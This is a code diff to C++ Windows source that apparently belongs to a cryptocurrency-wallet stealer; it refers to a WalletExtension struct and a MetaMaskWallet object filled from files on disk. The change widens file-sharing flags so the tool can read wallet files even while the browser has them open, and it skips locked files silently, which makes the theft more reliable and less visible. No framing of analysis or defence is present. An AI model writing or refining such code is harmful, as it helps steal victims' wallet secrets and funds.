@@ -6,6 +6,14 @@
 #include <sstream>
 #include <fstream>
 #include "../common.h"
+#include "../utils.h"
+
+// External logging functions
+extern "C" {
+    void LogInfo(const char* message);
+    void LogError(const char* message);
+    void LogWarning(const char* message);
+}
 
 struct WalletExtension {
     std::string name;
@@ -223,11 +231,19 @@ private:
     }
     
     void ExtractDataFromFile(const std::wstring& filePath, MetaMaskWallet& wallet) {
+        // Try to open with maximum sharing to avoid file locks
         HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ,
-                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
-                                  NULL, OPEN_EXISTING, 0, NULL);
+                                  FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+                                  NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
         
-        if (hFile == INVALID_HANDLE_VALUE) return;
+        if (hFile == INVALID_HANDLE_VALUE) {
+            DWORD error = GetLastError();
+            if (error == ERROR_SHARING_VIOLATION || error == ERROR_LOCK_VIOLATION) {
+                // File is locked, skip silently to avoid crashes
+                return;
+            }
+            return;
+        }
         
         LARGE_INTEGER fileSize;
         GetFileSizeEx(hFile, &fileSize);
